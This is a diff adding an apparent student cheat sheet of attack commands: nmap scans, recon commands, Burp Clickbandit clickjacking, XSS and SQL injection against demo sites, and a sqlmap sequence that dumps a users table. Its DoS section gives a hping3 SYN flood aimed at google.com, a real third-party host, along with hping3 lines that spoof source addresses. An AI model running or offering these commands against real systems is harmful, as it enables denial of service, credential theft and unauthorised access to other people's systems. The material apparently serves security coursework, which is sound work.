@@ -1,0 +1,138 @@
+﻿Nmap: (Instead of the given IP use your own ip by checking through ifconfig)
+
+
+1.tcp scan
+nmap -sT 192.168.1.100
+
+
+2.Xmas Scan
+sudo nmap -sX 192.168.1.100
+
+
+3.OS fingerprinting
+sudo nmap -O 192.168.1.100
+
+
+4.ping scanning
+nmap -sn 192.168.1.100
+
+
+5.port scanning
+nmap 192.168.1.100
+
+
+Network Reconnaisance:
+Windows:
+Ipconfig
+ping www.google.com
+tracert www.google.com
+arp
+arp -a
+nslookup   -> google.com
+netstat
+systeminfo
+ssh 192.168.239.133
+
+
+Kali:
+whois google.com
+dig google.com
+arp -n 
+
+
+
+
+ClickJacking: Apsara ice cream
+
+
+Setting up Burp Clickbandit
+Follow these steps to set up a Clickbandit attack:
+Go to the top-level Burp menu and select Burp Clickbandit.
+Click Copy Clickbandit to clipboard to copy the Clickbandit script.
+In your browser, visit the web page that you want to test.
+In your browser, open the developer console. This might be called Developer tools or JavaScript console.
+Paste the Clickbandit script into the developer console, and press enter.
+The Clickbandit banner appears at the top of the browser window.
+
+
+Running an attack
+To run a clickjacking attack using Burp Clickbandit:
+Click Start to load the website.
+Click around the site, mimicking the actions that a victim user might perform. This is recorded by Clickbandit.
+Click Finish to complete your attack.
+The target page handles clicks in the normal way. To disable this, select Disable click actions.
+
+
+To avoid frame busters, select Sandbox iframe. This adds the sandbox attribute to the iframe.
+
+
+XSS Attack(Search Bar):
+
+
+Altoro Mutual website (Write scripts in search bar and in feedback as well)
+
+
+HTML Injection (Search bar):
+
+
+Altoro Mutual website
+
+
+SQL Injection(login):
+https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/exploit/Auth_Bypass.txt
+
+
+
+
+SQLMap:
+http://testphp.vulnweb.com/artists.php?artist=1
+
+
+sqlmap -u url —dbs
+Y
+N
+N
+sqlmap -u url -D acuart —tables
+sqlmap -u url -D acuart -T users —columns
+sqlmap -u url -D acuart -T users -C uname —dump
+
+
+
+
+DOS attack(hping3):
+
+
+open wireshark
+start packet capturing
+start browser and search google.com
+open cmd 
+and execute following commands
+
+
+sudo apt-get install hping3
+
+
+sudo hping3 -S --flood -p 80 google.com
+
+
+open wireshark
+the packets capturing screen should turn red 
+DONE!
+
+
+More commands for Hping3:
+
+
+sudo hping3 -S -V -s 80 192.168.0.161
+sudo hping3 -c 5 192.168.0.161
+sudo hping3 -a 10.10.10.10 -c 5 192.168.0.161
+sudo hping3 –rand-source -c 192.168.0.161
+sudo hping3 -d 64 -c 5 192.168.0.161
+
+
+
+
+Wireshark Packet Sniffing:
+
+
+https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://wiki.wireshark.org/SampleCaptures&ved=2ahUKEwjZ_6-Iyu-FAxVCbvUHHe0AA34QFnoECB0QAQ&usg=AOvVaw2hqf9DYoVUGBSxfoD_bpfr
